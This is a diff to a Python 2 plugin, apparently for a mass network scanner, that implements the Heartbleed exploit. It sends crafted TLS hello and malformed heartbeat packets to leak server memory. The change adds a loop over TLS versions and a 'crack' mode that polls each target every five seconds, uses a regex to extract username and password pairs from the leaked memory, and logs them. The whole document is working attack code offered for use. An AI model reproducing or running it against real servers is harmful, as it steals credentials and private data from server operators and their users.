@@ -1,12 +1,12 @@
 from task import *
 import socket, struct, time
-import select
+import select, re
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
-hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
+def create_hello(version):
+    hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
@@ -20,13 +20,13 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01                                  
+00 0f 00 01 01
 ''')
+    return hello
 
-hb = h2bin(''' 
-18 03 02 00 03
-01 40 00
-''')
+def create_hb(version):
+    hb = h2bin('18 ' + version + ' 00 03 01 40 00')
+    return hb
 
 def hexdump(s):
     for b in xrange(0, len(s), 16):
@@ -73,7 +73,7 @@ def get_prints(s):
     for c in s:
         if 32 <= ord(c) <= 126:
             if sp_cnt > 0:
-                prints += '\x00'
+                prints += ' '
                 sp_cnt = 0
             prints += c
         else:
@@ -81,8 +81,8 @@ def get_prints(s):
 
     return prints
 
-def hit_hb(s):
-    s.send(hb)
+def hit_hb(s, version):
+    s.send(create_hb(version))    
     typ, ver, pay = recvmsg(s)   
     if typ == 24 and len(pay) > 3:       
         return get_prints(pay)
@@ -94,31 +94,64 @@ class sslhb_plugin(engine_plugin):
     def __init__(self, name):
         engine_plugin.__init__(self, name)
 
+    def process_sslhb(self, ip, port, filter):
+        try:
+            for version in ('03 00', '03 01','03 02','03 03'):
+                sock = socket.create_connection((ip, int(port)), 4)
+                if sock:
+                    sock.send(create_hello(version))
+                    while True:
+                        typ, ver, pay = recvmsg(sock)
+                        if typ == None:
+                             break
+                         
+                        # Look for server hello done message. 0x0E SERVER HELLO DONE
+                        if typ == 22 and ord(pay[0]) == 0x0E:
+                            s = hit_hb(sock, version)
+                            if s:
+                                if not filter:
+                                    return s
+                                
+                                m = re.search(filter, s);
+                                if m:
+                                    return m.group(0)
+                                
+                                return None
+                                
+                    sock.close()
+        except:
+            pass
+    
     def handle_task(self, task_info):
         ip =  socket.inet_ntoa(struct.pack("L", socket.htonl(task_info['work'])))
         #self.log(task_info, "handle_task: %s process:%d" %  (ip, task_info['process']))
         print "\r>>%s\t" % ip,
-        for port in self.get_cfg_vaule(task_info, "ports").split(" "):
-            try:
-                sock = socket.create_connection((ip, int(port)), 4)
-                if sock:
-                    #self.log(task_info, "%s\t%d\topen" % (ip, int(port)))
-                    sock.send(hello)
-                    
-                    while True:
-                        typ, ver, pay = recvmsg(sock)
-                        if typ == None:
-                            break
-                        
-                        # Look for server hello done message. 0x0E SERVER HELLO DONE
-                        if typ == 22 and ord(pay[0]) == 0x0E:
-                            s = hit_hb(sock)
-                            if s:
-                                self.log(task_info, "%s\t%d\t%s" % (ip, int(port), s))
+        
+        is_crack = self.get_cfg_vaule(task_info, "crack")
+        auth_info = None
+        
+        if is_crack:
+            filter = "([^=;&]+)[&;]*\s*pass\w*=(.+?)[;&\s]"
+        else:
+            filter = None
+            
+        while True:
+            result = None
+            for port in self.get_cfg_vaule(task_info, "ports").split(" "):
+                result = self.process_sslhb(ip, port, filter)
+                if result and not is_crack:
+                    self.log(task_info, "%s\t%s\t%s" % (ip, port, result))
+                    return
                 
-                sock.close()
-            except:
-                pass
+            if not is_crack:
+                break
+            
+            if auth_info != result:
+                self.log(task_info, "%s\t%s\t%s" % (ip, port, result))
+                auth_info = result
+                
+            time.sleep(5)
             
 def init_plugin(name):
     return sslhb_plugin(name)
+
